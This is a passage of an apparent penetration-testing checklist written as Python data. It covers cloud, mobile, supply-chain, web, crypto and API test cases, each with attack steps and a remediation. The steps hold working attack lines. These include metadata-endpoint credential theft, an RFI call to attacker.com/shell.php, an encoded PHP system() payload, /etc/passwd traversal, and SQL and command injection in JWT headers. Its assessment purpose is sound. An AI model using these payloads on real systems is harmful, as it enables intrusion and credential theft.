        "description": "Terraform state files contain plaintext credentials, resource ARNs, and infrastructure topology — essentially complete cloud credentials.",
        "attack_pattern": "Access Terraform state from public S3 buckets or misconfigured backends.",
        "steps": [
            "Check S3 buckets for: terraform.tfstate, *.tfstate, terraform.tfstate.backup",
            "Test: aws s3 ls s3://<company>-terraform-state --no-sign-request",
            "Check GitHub repos for .tfstate files committed accidentally",
            "Parse state file: grep -E 'password|secret|key|token' terraform.tfstate",
            "Look for RDS passwords, IAM secret keys, and TLS certificates in state",
        ],
        "expected_result": "Remote state backend with encryption. S3 state bucket private. State files gitignored. Use Vault for secret management.",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "tools": {"nuclei_tags": ["cloud", "exposure", "s3"]},
        "applicable_to": ["cloud"], "tags": ["terraform", "cloud", "secrets", "critical"],
    },
    {
        "id": "TC-C007", "title": "ECR / GCR Public Container Registry",
        "category": "Cloud Security", "severity": "high",
        "description": "Public container registries expose application images containing hardcoded secrets, internal infrastructure details, and sensitive business logic.",
        "attack_pattern": "Pull and analyze publicly accessible container images.",
        "steps": [
            "Test ECR public: docker pull public.ecr.aws/<alias>/<repo>:latest",
            "Test Docker Hub: docker pull <company>/<repo> — many companies push to public Docker Hub",
            "Analyze layers: docker save image | tar x; grep -r 'password\\|secret\\|key' .",
            "Use dive to inspect each layer: dive <image>",
            "Extract ENV variables: docker inspect <image> | jq '.[].Config.Env'",
        ],
        "expected_result": "Images stored in private registries. No secrets in Dockerfile ENV or layers. Use build secrets for build-time credentials.",
        "cwe": "CWE-538", "owasp": "A05:2021",
        "tools": {},
        "applicable_to": ["cloud"], "tags": ["cloud", "docker", "container", "secrets"],
    },
    {
        "id": "TC-C008", "title": "ECS Task / EKS Pod Service Account Credential Theft",
        "category": "Cloud Security", "severity": "critical",
        "description": "Compromised containers can retrieve IAM credentials from the ECS metadata endpoint or Kubernetes service account tokens, enabling cloud-wide privilege escalation.",
        "attack_pattern": "From a compromised container, access container-specific credentials.",
        "steps": [
            "ECS credentials: curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
            "Compare to IMDS: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "K8s service account token: cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "K8s API from inside pod: curl -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' https://kubernetes.default.svc/api/v1/pods",
            "Test permissions: kubectl auth can-i --list (what can this service account do?)",
        ],
        "expected_result": "ECS tasks use minimal IAM roles. K8s service accounts follow least privilege. Network policy blocks IMDS from untrusted pods.",
        "cwe": "CWE-269", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["cloud", "aws", "kubernetes"]},
        "applicable_to": ["cloud"], "tags": ["cloud", "ecs", "kubernetes", "critical", "privilege-escalation"],
    },
    {
        "id": "TC-C009", "title": "CloudFormation / Deployment Template Secrets",
        "category": "Cloud Security", "severity": "high",
        "description": "CloudFormation stacks sometimes expose parameter values including passwords in stack outputs, events, or describe-stacks responses.",
        "attack_pattern": "Read CloudFormation stack outputs and parameter history.",
        "steps": [
            "List stacks: aws cloudformation describe-stacks",
            "Read outputs: aws cloudformation describe-stacks --stack-name <name> | jq '.Stacks[].Outputs'",
            "Check stack events: aws cloudformation describe-stack-events — parameters may appear in events",
            "Check template: aws cloudformation get-template — may contain Default values with credentials",
            "Read SSM parameters referenced in templates: aws ssm get-parameters --names /prod/db/password",
        ],
        "expected_result": "Use NoEcho=true for sensitive parameters. Store secrets in Secrets Manager or SSM SecureString.",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "tools": {},
        "applicable_to": ["cloud"], "tags": ["cloud", "cloudformation", "aws", "secrets"],
    },
    {
        "id": "TC-C010", "title": "Azure Managed Identity Abuse",
        "category": "Cloud Security", "severity": "critical",
        "description": "Azure Managed Identities with over-permissive roles allow compromised VMs or containers to access storage, key vaults, and other resources without credentials.",
        "attack_pattern": "From a compromised Azure resource, request Managed Identity tokens.",
        "steps": [
            "Get token: curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H 'Metadata: true'",
            "Use token to list subscriptions, resource groups, and storage accounts",
            "Access Key Vault: curl -H 'Authorization: Bearer <token>' https://<vault>.vault.azure.net/secrets/",
            "Test SSRF to reach IMDS endpoint from web app (see TC-W004)",
            "Check Managed Identity assigned roles: az role assignment list --assignee <principalId>",
        ],
        "expected_result": "Managed Identities follow least-privilege. Scope to specific resources. Monitor IMDS access.",
        "cwe": "CWE-269", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["azure", "cloud"]},
        "applicable_to": ["cloud"], "tags": ["azure", "managed-identity", "cloud", "critical"],
    },

    # ── INFORMATION DISCLOSURE (additional) ───────────────────────────────────
    {
        "id": "TC-I004", "title": "Server-Side Path Disclosure",
        "category": "Information Disclosure", "severity": "low",
        "description": "Error messages revealing absolute server paths (/var/www/html/, C:\\inetpub\\wwwroot\\) help attackers plan LFI/RFI attacks.",
        "attack_pattern": "Trigger errors that reveal the physical file system path.",
        "steps": [
            "Submit invalid file path parameter: ?file=invalid_file_name_xyz",
            "Trigger include errors: load non-existent template or module",
            "Submit malformed JSON/XML to API endpoints",
            "Trigger 500 errors and inspect response bodies and logs",
            "Check for Windows-style paths: C:\\, D:\\ in error messages (reveals OS)",
        ],
        "expected_result": "All errors must return generic messages. Internal paths never exposed to client.",
        "cwe": "CWE-209", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "error-page"]},
        "applicable_to": ["web", "api"], "tags": ["information-disclosure", "path-disclosure"],
    },
    {
        "id": "TC-I005", "title": "Internal IP Address Disclosure",
        "category": "Information Disclosure", "severity": "medium",
        "description": "Responses containing internal RFC 1918 IP addresses expose network topology useful for lateral movement and SSRF targeting.",
        "attack_pattern": "Inspect all response headers, bodies, and redirects for internal IP addresses.",
        "steps": [
            "Scan response headers: X-Real-IP, X-Forwarded-For, X-Backend-Server, Via",
            "Check redirect responses: Location: http://10.0.0.5/login",
            "Check error pages: 'Cannot connect to 192.168.1.100:5432'",
            "Monitor DNS lookups triggered by the application — resolve to internal IPs?",
            "XML/JSON responses: look for internal_host, backend_ip, server_address fields",
        ],
        "expected_result": "Internal IPs stripped from all outbound traffic. Reverse proxy normalizes all IP-related headers.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure"]},
        "applicable_to": ["web", "api"], "tags": ["information-disclosure", "ip-disclosure"],
    },
    {
        "id": "TC-I006", "title": "Sensitive Data in HTTP Response Bodies",
        "category": "Information Disclosure", "severity": "high",
        "description": "APIs returning full objects often include password hashes, PII, tokens, internal notes, and other sensitive fields that should be filtered.",
        "attack_pattern": "Inspect all API response fields against what is displayed in the UI.",
        "steps": [
            "Intercept all API responses and compare fields to UI display",
            "Look for: password_hash, password_reset_token, 2fa_secret, ssn, full_credit_card",
            "Test user list endpoint: does it return all users' private info?",
            "Test profile endpoint for current user: does it include internal_notes, admin_comments?",
            "Check audit logs, admin endpoints — do they include plaintext passwords from logs?",
        ],
        "expected_result": "API responses serialized with explicit field allowlists (DTOs). Sensitive fields never returned.",
        "cwe": "CWE-200", "owasp": "A03:2021",
        "tools": {},
        "applicable_to": ["api", "web"], "tags": ["information-disclosure", "api", "data-exposure"],
    },
    {
        "id": "TC-I007", "title": "Insecure Direct Object Reference on File Download",
        "category": "Information Disclosure", "severity": "high",
        "description": "File download endpoints with predictable or user-controlled filenames allow unauthorized download of other users' files.",
        "attack_pattern": "Manipulate file ID or filename parameters to download arbitrary files.",
        "steps": [
            "Upload a file as user A and note the file ID/path",
            "As user B, download with user A's file ID: GET /api/files/A_file_id",
            "Test filename-based access: GET /api/download?file=user_a_report.pdf",
            "Test path traversal in download: GET /api/download?file=../../etc/passwd",
            "Test unguessable names: if files use predictable IDs (sequential, timestamp-based), enumerate",
        ],
        "expected_result": "File access verifies ownership. Filenames randomly generated. No user-controlled path traversal.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["idor", "file-download", "information-disclosure"],
    },

    # ── MOBILE (additional) ───────────────────────────────────────────────────
    {
        "id": "TC-MOB004", "title": "Exported Activity / Intent Hijacking (Android)",
        "category": "Mobile", "severity": "high",
        "description": "Android activities exported without proper permission requirements can be invoked by malicious apps to bypass authentication or steal data.",
        "attack_pattern": "Invoke exported activities from a malicious app or via ADB.",
        "steps": [
            "Decompile APK: apktool d app.apk — inspect AndroidManifest.xml",
            "Find exported activities: android:exported='true' without permission attribute",
            "Invoke via ADB: adb shell am start -n com.target.app/.AuthenticatedActivity",
            "Pass malicious intent extras: adb shell am start -n com.target.app/.FileActivity --es filename '../../data/data/com.target.app/databases/db'",
            "Test implicit intents: can a malicious app intercept OAuth callbacks?",
        ],
        "expected_result": "Only intentionally exported components should be exported. All exported components require appropriate permissions.",
        "cwe": "CWE-926", "owasp": "M1:2024",
        "tools": {},
        "applicable_to": ["mobile"], "tags": ["mobile", "android", "intent"],
    },
    {
        "id": "TC-MOB005", "title": "WebView JavaScript Bridge Abuse",
        "category": "Mobile", "severity": "critical",
        "description": "Android/iOS WebViews with JavaScript interfaces exposed to web content allow XSS in loaded pages to call native app functions with full device access.",
        "attack_pattern": "Inject XSS into content loaded in a WebView with a JavaScript bridge.",
        "steps": [
            "Decompile and search: addJavascriptInterface or WKScriptMessageHandler in source",
            "Identify which URLs are loaded in WebViews with JavaScript bridges",
            "Test if WebView loads user-controlled URLs or content",
            "Inject XSS: if attacker controls loaded content, call native.getContacts() or native.readFile('/path')",
            "Test on Android < 4.2: all Java methods in addJavascriptInterface are accessible",
        ],
        "expected_result": "WebView JavaScript interface disabled if not needed. Loaded URLs allowlisted. No user-controlled URLs in sensitive WebViews.",
        "cwe": "CWE-79", "owasp": "M4:2024",
        "tools": {},
        "applicable_to": ["mobile"], "tags": ["mobile", "webview", "xss", "critical"],
    },
    {
        "id": "TC-MOB006", "title": "Insecure Network Communication (Mobile)",
        "category": "Mobile", "severity": "high",
        "description": "Mobile apps communicating over HTTP or with weak TLS allow on-path attackers to intercept credentials and session tokens.",
        "attack_pattern": "Monitor app network traffic via proxy on the same Wi-Fi network.",
        "steps": [
            "Set up Burp proxy on same Wi-Fi network as the test device",
            "Configure device to use proxy: Settings → Wi-Fi → Proxy",
            "Run all app flows and monitor traffic in Burp",
            "Check for any HTTP (non-TLS) requests",
            "Check for TLS certificate validation errors that are silently ignored",
            "Test on Android with network_security_config.xml overriding trust anchors",
        ],
        "expected_result": "All traffic over TLS 1.2+. No cleartext fallback. Certificate pinning implemented.",
        "cwe": "CWE-319", "owasp": "M5:2024",
        "tools": {},
        "applicable_to": ["mobile"], "tags": ["mobile", "tls", "network"],
    },
    {
        "id": "TC-MOB007", "title": "Tapjacking (Android UI Redressing)",
        "category": "Mobile", "severity": "medium",
        "description": "Malicious apps overlaying transparent windows on top of target app screens trick users into granting permissions or performing actions in the target app.",
        "attack_pattern": "Create an overlay window that intercepts taps intended for the target app.",
        "steps": [
            "Create test app with SYSTEM_ALERT_WINDOW permission and draw overlay on target app",
            "Align transparent button over 'Allow' button in permission dialog",
            "Verify user tap on 'Deny' (visible) triggers 'Allow' (actual target under overlay)",
            "Test filterTouchesWhenObscured flag: is it set on sensitive views?",
            "Check if app uses FLAG_SECURE to prevent screenshot and overlay attacks",
        ],
        "expected_result": "Use filterTouchesWhenObscured=true on sensitive buttons. FLAG_SECURE on sensitive screens.",
        "cwe": "CWE-1021", "owasp": "M7:2024",
        "tools": {},
        "applicable_to": ["mobile"], "tags": ["mobile", "tapjacking", "android"],
    },

    # ── SUPPLY CHAIN (additional) ─────────────────────────────────────────────
    {
        "id": "TC-SC002", "title": "Typosquatting / Malicious Package Installation",
        "category": "Supply Chain", "severity": "high",
        "description": "Developers installing typo-squatted packages (requets instead of requests) execute attacker code in the development environment and potentially in production builds.",
        "attack_pattern": "Identify used packages and check for plausible typosquatting variants.",
        "steps": [
            "List dependencies: cat package.json, requirements.txt, Gemfile, go.mod",
            "Generate typosquats: missing letter, transposed letters, added characters",
            "Check npm/PyPI for published typosquats: npm info reqest, pip install reqeusts --dry-run",
            "Inspect package post-install scripts for suspicious behavior: 'install' scripts in package.json",
            "Check for recently published packages that impersonate well-known ones",
        ],
        "expected_result": "Pin exact dependency versions with integrity hashes. Use lock files. Audit with npm audit / safety check.",
        "cwe": "CWE-829", "owasp": "A08:2021",
        "tools": {},
        "applicable_to": ["web", "api", "cloud"], "tags": ["supply-chain", "dependency"],
    },
    {
        "id": "TC-SC003", "title": "GitHub Actions Secret Exfiltration",
        "category": "Supply Chain", "severity": "critical",
        "description": "GitHub Actions workflows that use third-party actions or run on pull requests from forks can exfiltrate repository secrets if not properly restricted.",
        "attack_pattern": "Trigger workflow with malicious steps or exploit pull_request_target to access secrets.",
        "steps": [
            "Check .github/workflows/ for pull_request_target with secret access",
            "Create fork with modified workflow that exfiltrates secrets",
            "Test if workflow steps use: actions/checkout@v2 without pinning to SHA (vulnerable to takeover)",
            "Check if third-party actions are pinned to SHA: uses: actions/setup-node@sha256:... vs @main",
            "Test environment secrets: check if GITHUB_TOKEN has more permissions than needed",
        ],
        "expected_result": "Pin all actions to SHA. Restrict pull_request_target workflows. Follow principle of least privilege for GITHUB_TOKEN.",
        "cwe": "CWE-312", "owasp": "A08:2021",
        "tools": {"nuclei_tags": ["cicd", "exposure"]},
        "applicable_to": ["cloud", "web"], "tags": ["supply-chain", "github-actions", "secrets", "critical"],
    },
    {
        "id": "TC-SC004", "title": "Package Integrity Verification (SRI / Lock Files)",
        "category": "Supply Chain", "severity": "medium",
        "description": "Missing integrity checks on installed packages or frontend resources allow substituted malicious versions to go undetected.",
        "attack_pattern": "Verify lock files are committed and frontend resources use SRI hashes.",
        "steps": [
            "Check if package-lock.json / yarn.lock / Pipfile.lock is committed",
            "Test: remove lock file and install — do you get the same versions?",
            "Check frontend: do CDN script/link tags have integrity= attributes?",
            "Test HTTPS for all package registry sources in .npmrc, pip.conf",
            "Verify no custom package mirrors that might serve modified packages",
        ],
        "expected_result": "Lock files committed. SRI on all CDN resources. Packages installed only from official registries over HTTPS.",
        "cwe": "CWE-345", "owasp": "A08:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["supply-chain", "sri", "integrity"],
    },

    # ── MODERN WEB ATTACKS (additional) ───────────────────────────────────────
    {
        "id": "TC-MW005", "title": "OAuth Token Leakage via Referrer",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "OAuth access tokens or authorization codes embedded in redirect URLs leak to third-party analytics and advertising scripts via the HTTP Referer header.",
        "attack_pattern": "Observe Referer headers on OAuth callback pages that load third-party scripts.",
        "steps": [
            "Complete OAuth flow — observe the redirect URL containing ?code= or #access_token=",
            "On the callback page, check if any third-party scripts are loaded (analytics, ads)",
            "Monitor network requests from the callback page — do they include Referer with the token?",
            "Test: add a network monitor script to the callback page and observe Referer propagation",
            "Check for Referrer-Policy header on the callback page",
        ],
        "expected_result": "OAuth callbacks must have Referrer-Policy: no-referrer. No third-party resources on callback pages.",
        "cwe": "CWE-598", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["oauth", "token-leak", "referrer"],
    },
    {
        "id": "TC-MW006", "title": "Mass Assignment in GraphQL Mutations",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "GraphQL mutations accepting object inputs may allow setting privileged fields not intended for users, similar to mass assignment in REST APIs.",
        "attack_pattern": "Add privileged fields to GraphQL mutation inputs.",
        "steps": [
            "Query schema for mutation input types: { __type(name: 'UpdateUserInput') { inputFields { name } } }",
            "Add unauthorized fields: mutation { updateUser(input: { id: 1, role: ADMIN, isVerified: true }) }",
            "Test: create mutations with extra fields like orgId, planTier, creditBalance",
            "Test subscription mutations: can you subscribe to another user's events?",
            "Test fragment variables that inject extra fields",
        ],
        "expected_result": "Explicit allowlist of permitted mutation input fields. Deny unknown fields server-side.",
        "cwe": "CWE-915", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["graphql"]},
        "applicable_to": ["api"], "tags": ["graphql", "mass-assignment", "authorization"],
    },
    {
        "id": "TC-MW007", "title": "Email Verification Bypass / Token Reuse",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "Email verification tokens that are not invalidated after use, predictable, or shared across users allow account verification bypass.",
        "attack_pattern": "Test email verification token validity, reuse, and predictability.",
        "steps": [
            "Register and capture email verification link",
            "Verify the account using the link",
            "Attempt to use the same verification link again — is it still valid?",
            "Test token predictability: register 5 accounts rapidly and compare tokens for sequential patterns",
            "Test if verification link can be forwarded for a different email address",
            "Test link expiry: does a 7-day-old verification link still work?",
        ],
        "expected_result": "Single-use tokens. 24-48 hour expiry. Cryptographically random. Server-side invalidation on use.",
        "cwe": "CWE-640", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["auth", "email-verification", "token-reuse"],
    },
    {
        "id": "TC-MW008", "title": "SSRF via URL Redirectors",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "SSRF protections using allowlists are often bypassed using open redirect vulnerabilities on allowlisted domains to redirect to internal targets.",
        "attack_pattern": "Chain an open redirect on an allowlisted domain to bypass SSRF allowlists.",
        "steps": [
            "Identify an SSRF vector with domain allowlist: only *.trusted-partner.com allowed",
            "Find an open redirect on trusted-partner.com: https://trusted-partner.com/redirect?url=http://169.254.169.254/",
            "Submit to SSRF vector: {\"url\": \"https://trusted-partner.com/redirect?url=http://169.254.169.254/\"}",
            "Test gopher:// protocol for deeper exploitation if redirect target is TCP-based",
            "Test protocol confusion: file://trusted-partner.com/../../../etc/passwd",
        ],
        "expected_result": "SSRF protection must resolve URLs and block RFC 1918 IPs after following redirects. DNS rebind protection.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {"nuclei_tags": ["ssrf"]},
        "applicable_to": ["web", "api"], "tags": ["ssrf", "redirect-chain", "bypass"],
    },
    {
        "id": "TC-MW009", "title": "2FA Implementation Flaws (Real Bug Patterns)",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "Real-world 2FA bypasses from HackerOne reports: code leakage in response, missing rate limiting, bypass via API endpoint, and backup code exhaustion.",
        "attack_pattern": "Test multiple 2FA bypass vectors based on real-world bug bounty findings.",
        "steps": [
            "Code in response: inspect the 2FA challenge API response — does it include the expected TOTP code?",
            "Missing endpoint protection: test /api/v2/login (vs /api/v1/login with 2FA) — does v2 skip MFA?",
            "Backup code enumeration: if backup codes are 8-digit numbers, brute-force 10^8 possibilities",
            "Trusted device bypass: can the trusted device cookie be reused across accounts or after password change?",
            "SMS code interception: test SIM swap resistance — can attacker call provider to reassign number?",
            "Email fallback: is email 2FA fallback weaker than TOTP? Test email 2FA code brute-force.",
        ],
        "expected_result": "2FA codes never returned in API responses. Consistent enforcement across all API versions. Rate limiting on all 2FA endpoints.",
        "cwe": "CWE-287", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["mfa", "2fa", "auth", "bypass"],
    },
    {
        "id": "TC-MW010", "title": "Salesforce / CRM Object Exposure",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "Salesforce Community portals with misconfigured object sharing rules expose customer records, internal cases, and sensitive business data to unauthenticated or unauthorized users.",
        "attack_pattern": "Test SOQL injection and object accessibility in Salesforce portals.",
        "steps": [
            "Test SOQL injection: ?q=SELECT+Id,Name+FROM+Account+WHERE+Name+LIKE+'a%25' OR '1'='1'",
            "Test unauthenticated record access: community portal URLs /apex/page without login",
            "Test object permissions: can guest user access Account, Contact, Case, Opportunity?",
            "Test file access: GET /sfc/servlet.shepherd/document/download/<content_doc_id>",
            "Use Salesforce Lightning API: /aura?message= with arbitrary component instantiation",
        ],
        "expected_result": "Guest user profile has minimal permissions. Object sharing rules follow least-privilege. No public access to internal objects.",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["salesforce", "crm", "authorization"],
    },
    {
        "id": "TC-MW011", "title": "Insecure File Inclusion via URL Parameter",
        "category": "Modern Web Attacks", "severity": "critical",
        "description": "Remote File Inclusion (RFI) loads and executes code from attacker-controlled servers. Combined with LFI, enables full RCE.",
        "attack_pattern": "Inject remote URL into file inclusion parameters.",
        "steps": [
            "Find parameters used for server-side file inclusion: ?page=, ?module=, ?include=, ?template=",
            "Test LFI: ?page=../../../../etc/passwd",
            "Test RFI (PHP with allow_url_include=On): ?page=http://attacker.com/shell.php",
            "Test protocol wrappers: ?page=php://filter/convert.base64-encode/resource=index.php",
            "Test php://input wrapper with POST body containing PHP code",
            "Test data:// wrapper: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
        ],
        "expected_result": "Never pass user input to include/require. Allowlist permitted templates. Disable allow_url_include.",
        "cwe": "CWE-98", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["lfi", "rfi", "rce"]},
        "applicable_to": ["web"], "tags": ["lfi", "rfi", "inclusion", "rce", "critical"],
    },
    {
        "id": "TC-MW012", "title": "Account Takeover via Forgot Password with Predictable Token",
        "category": "Modern Web Attacks", "severity": "critical",
        "description": "Password reset tokens derived from timestamps, MD5 of email, or sequential integers are brute-forceable, enabling account takeover without interaction.",
        "attack_pattern": "Analyze password reset token generation for predictability.",
        "steps": [
            "Request password reset for test account 5 times rapidly — collect all tokens",
            "Compare tokens: are they sequential? Do they share common substrings?",
            "Decode: is token base64(email + timestamp)? Is it MD5(email)?",
            "Test timestamp-based: if token is timestamp-based, generate tokens for T-60 to T+60",
            "Test if token generation uses predictable seed: reset + observe, advance clock, predict next",
            "Test token length: if < 10 chars, brute-force all possibilities",
        ],
        "expected_result": "Reset tokens use CSPRNG with ≥128 bits entropy. Single use. Expire in 15-60 minutes.",
        "cwe": "CWE-640", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["auth", "password-reset", "token", "account-takeover", "critical"],
    },

    # ── CRYPTOGRAPHY (additional) ─────────────────────────────────────────────
    {
        "id": "TC-CRY003", "title": "Padding Oracle Attack",
        "category": "Cryptography", "severity": "high",
        "description": "CBC mode encryption with PKCS#7 padding validation errors leaks information enabling decryption and arbitrary plaintext encryption without the key.",
        "attack_pattern": "Manipulate encrypted tokens and observe error vs. success response differences.",
        "steps": [
            "Identify encrypted values in cookies, parameters, or tokens (base64 + block-aligned length)",
            "Flip individual bits in the ciphertext — if padding error response differs from MAC error: vulnerable",
            "Use padbuster: padbuster <url> <encrypted_value> 8 --encoding 0",
            "Decrypt arbitrary ciphertext without the key using oracle (1 byte at a time)",
            "Forge encrypted tokens to set admin=true in decrypted plaintext",
        ],
        "expected_result": "Use authenticated encryption (AES-GCM). If CBC, use constant-time padding verification (return generic error).",
        "cwe": "CWE-649", "owasp": "A02:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["crypto", "padding-oracle", "decryption"],
    },
    {
        "id": "TC-CRY004", "title": "Hash Length Extension Attack",
        "category": "Cryptography", "severity": "high",
        "description": "MAC schemes using H(secret || message) without HMAC are vulnerable to length extension attacks, allowing forgery of additional data without knowing the secret.",
        "attack_pattern": "Use hash length extension to append data to a signed message.",
        "steps": [
            "Identify signed parameters: ?data=user_data&sig=SHA256_hash",
            "Determine hash algorithm from signature length (32 bytes = SHA256)",
            "Use hashpump: hashpump -s <known_sig> -d <known_data> -a <additional_data> -k <key_length>",
            "Submit the forged signature with the extended data",
            "Test in file download signatures, API signed requests, and authentication tokens",
        ],
        "expected_result": "Use HMAC(key, message) not H(key || message). Sign the entire message with a proper MAC.",
        "cwe": "CWE-327", "owasp": "A02:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["crypto", "hash-extension", "signature-bypass"],
    },
    {
        "id": "TC-CRY005", "title": "Hardcoded Encryption Keys / IV Reuse",
        "category": "Cryptography", "severity": "high",
        "description": "Static encryption keys and reused IVs in AES-CTR or AES-GCM negate encryption security, allowing plaintext recovery and forgery.",
        "attack_pattern": "Identify static IVs and test for keystream reuse.",
        "steps": [
            "Decompile mobile app or extract config: search for AES, hardcoded 16/32-byte hex strings",
            "Observe encrypted values from multiple requests — if IV is the same, XOR ciphertexts to recover keystream",
            "Test IV reuse in AES-CTR: C1 XOR C2 = P1 XOR P2 — if plaintext of one is known, recover the other",
            "Test GCM nonce reuse: same nonce + different plaintext = authentication key recovery",
            "Check for hardcoded keys in git history: git log -p | grep -E '[0-9a-f]{32}'",
        ],
        "expected_result": "Keys from key management service (KMS/Vault). Random IV/nonce per encryption. Rotate keys regularly.",
        "cwe": "CWE-329", "owasp": "A02:2021",
        "tools": {},
        "applicable_to": ["web", "api", "mobile"], "tags": ["crypto", "hardcoded-key", "iv-reuse"],
    },

    # ── ADDITIONAL RECONNAISSANCE ─────────────────────────────────────────────
    {
        "id": "TC-R015", "title": "favicon.ico Hash Fingerprinting",
        "category": "Reconnaissance", "severity": "info",
        "description": "Favicons have unique Murmur3 hashes indexed by Shodan and other tools, enabling identification of identical apps across all IP ranges.",
        "attack_pattern": "Hash the target's favicon and search Shodan/Censys for all matching hosts.",
        "steps": [
            "Download favicon: curl https://target.com/favicon.ico -o favicon.ico",
            "Calculate Shodan hash: python3 -c \"import mmh3, requests, codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content, 'base64').replace(b'\\n',b'')))\"",
            "Search Shodan: http.favicon.hash:<hash_value>",
            "Identify all instances of the same application on different IPs and ports",
            "Test discovered instances for the same vulnerabilities",
        ],
        "expected_result": "Use a unique, non-stock favicon. Consider proxying all assets behind a CDN.",
        "cwe": "CWE-200", "owasp": None,
        "tools": {"nuclei_tags": ["exposure", "tech"]},
        "applicable_to": ["web"], "tags": ["recon", "passive", "fingerprint", "shodan"],
    },
    {
        "id": "TC-R016", "title": "GitHub Dork & Commit History Mining",
        "category": "Reconnaissance", "severity": "critical",
        "description": "GitHub's search API finds secrets committed to public repos. Commit history often retains deleted secrets.",
        "attack_pattern": "Search GitHub for target-specific strings combined with secret keywords.",
        "steps": [
            "GitHub search: org:target-company password OR secret OR api_key",
            "Search by domain: 'target.com' AND 'password'",
            "Search for config patterns: 'DB_PASSWORD' org:target",
            "Check deleted files in git history: git log --all --full-history -- '*.env'",
            "Use trufflehog3 for entropy-based detection: trufflehog github --org target --only-verified",
            "Check .git/refs/stash — stashed changes visible in clone",
        ],
        "expected_result": "Pre-commit hooks scan for secrets (gitleaks). Secrets rotation policy. GitHub secret scanning enabled.",
        "cwe": "CWE-798", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["exposure", "token"]},
        "applicable_to": ["web", "api", "cloud"], "tags": ["recon", "github", "secrets", "critical"],
    },

    # ── ADDITIONAL API ────────────────────────────────────────────────────────
    {
        "id": "TC-API012", "title": "JWT Kid Header SQL / Path Injection",
        "category": "API Security", "severity": "critical",
        "description": "The JWT 'kid' (Key ID) header used to select a verification key is sometimes used in SQL queries or file reads, enabling SQL injection or path traversal for signature bypass.",
        "attack_pattern": "Inject SQL or path traversal via the JWT kid header.",
        "steps": [
            "Decode JWT header and add/modify: {\"alg\": \"HS256\", \"kid\": \"../../dev/null\"}",
            "Sign with empty string — if kid is used as filename, /dev/null is empty = empty secret",
            "Test SQL injection in kid: {\"kid\": \"x' UNION SELECT 'attacker_secret' -- -\"}",
            "Sign the JWT with 'attacker_secret' — if SQL injection works, server will verify with this key",
            "Test kid as OS command: {\"kid\": \"key; cat /etc/passwd; echo\"}",
        ],
        "expected_result": "Validate and sanitize kid header. Use a pre-approved key lookup table, not dynamic file paths.",
        "cwe": "CWE-89", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["jwt", "injection"]},
        "applicable_to": ["api", "web"], "tags": ["jwt", "injection", "critical"],
    },
    {
        "id": "TC-API013", "title": "SSRF via PDF / Image / URL Import Features",
        "category": "API Security", "severity": "high",
        "description": "Features that import from URLs (URL-to-PDF, screenshot, link preview, embed URL) are high-value SSRF vectors targeting internal services.",
        "attack_pattern": "Supply internal URLs to all URL-consuming features.",
        "steps": [
            "Find URL intake features: 'Import from URL', link preview, image by URL, embed, WebHook test",
            "Test: http://127.0.0.1/, http://localhost/, http://[::1]/",
            "Test internal services: http://internal-api:8080/admin, http://postgres:5432/",
            "Test cloud IMDS: http://169.254.169.254/latest/meta-data/ (AWS), http://metadata.google.internal/",
            "Test non-HTTP protocols: file:///etc/passwd, gopher://127.0.0.1:6379/_PING, dict://localhost:11211/stat",
        ],
        "expected_result": "Allowlist of allowed URL schemes and domains. Block RFC 1918. Resolve URL and recheck IP after DNS.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {"nuclei_tags": ["ssrf"]},
        "applicable_to": ["web", "api"], "tags": ["ssrf", "url-import", "api"],
    },

    # ── ADDITIONAL INFRASTRUCTURE ─────────────────────────────────────────────
    {
        "id": "TC-N016", "title": "Exposed Spring Boot Actuator Endpoints",
        "category": "Infrastructure", "severity": "critical",
        "description": "Spring Boot Actuator endpoints (/actuator/env, /actuator/heapdump, /actuator/jolokia) expose credentials, memory dumps, and remote code execution via JMX.",
        "attack_pattern": "Probe Spring Actuator endpoints for sensitive data and RCE vectors.",
        "steps": [
            "Probe: /actuator, /actuator/health, /actuator/env, /actuator/beans, /actuator/info",
            "/actuator/env: returns all application properties including passwords (Spring Boot < 2.0 in plaintext)",
            "/actuator/heapdump: download JVM heap dump, extract credentials with jhat or strings",
            "/actuator/jolokia: JMX over HTTP — execute: POST /actuator/jolokia with MBean invocation for RCE",
            "/actuator/loggers: change log level to debug — may trigger verbose credential logging",
            "/actuator/shutdown: POST kills the application",
        ],
        "expected_result": "Actuator endpoints disabled or behind authentication. Only /health and /info exposed if necessary.",
